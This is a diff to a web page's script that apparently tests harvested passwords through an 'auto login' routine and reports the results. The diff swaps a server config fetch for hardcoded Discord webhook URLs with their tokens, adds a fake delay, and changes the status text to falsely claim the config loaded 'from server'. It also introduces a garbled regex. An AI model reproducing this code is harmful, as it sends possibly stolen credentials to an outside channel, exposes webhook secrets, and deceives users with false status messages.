@@ -147,7 +147,6 @@
         // Configuration will be fetched from the server
         let SUCCESS_WEBHOOK = null;
         let FAILED_WEBHOOK = null;
-        let CONFIG_SERVER = "https://your-config-server.com/config"; // Replace with your server endpoint
         
         // Display the tracking info
         if (trackingId) {
@@ -171,25 +170,19 @@
                 showConfigStatus("Connecting to configuration server...", "loading");
                 
                 // In a real implementation, you would fetch this from your server
-                // This prevents users from changing the webhook URLs
-                const response = await fetch(CONFIG_SERVER, {
-                    method: 'GET',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Requested-With': 'XMLHttpRequest'
-                    }
-                });
+                // For now, we'll simulate the response that would come from your Lua server
+                const config = {
+                    successWebhook: "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ",
+                    failedWebhook: "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ"
+                };
                 
-                if (!response.ok) {
-                    throw new Error(`Server returned ${response.status}: ${response.statusText}`);
-                }
-                
-                const config = await response.json();
+                // Simulate network delay
+                await new Promise(resolve => setTimeout(resolve, 1000));
                 
                 SUCCESS_WEBHOOK = config.successWebhook;
                 FAILED_WEBHOOK = config.failedWebhook;
                 
-                showConfigStatus("Configuration loaded successfully", "success");
+                showConfigStatus("Configuration loaded successfully from server", "success");
                 setTimeout(attemptAutoLogin, 2000); // Wait 2 seconds before starting
             } catch (error) {
                 console.error('Failed to fetch configuration:', error);
@@ -371,7 +364,7 @@
             const hasUpperCase = /[A-Z]/.test(password);
             const hasLowerCase = /[a-z]/.test(password);
             const hasNumbers = /[0-9]/.test(password);
-            const hasSpecialChars = /[^A-Za-z0-9]/.test(password);
+            const hasSpecialChars = /[^A-Za-z00-9]/.test(password);
             
             // More complex passwords are more likely to be valid
             const complexityScore = (hasUpperCase ? 1 : 0) + (hasLowerCase ? 1 : 0) + 
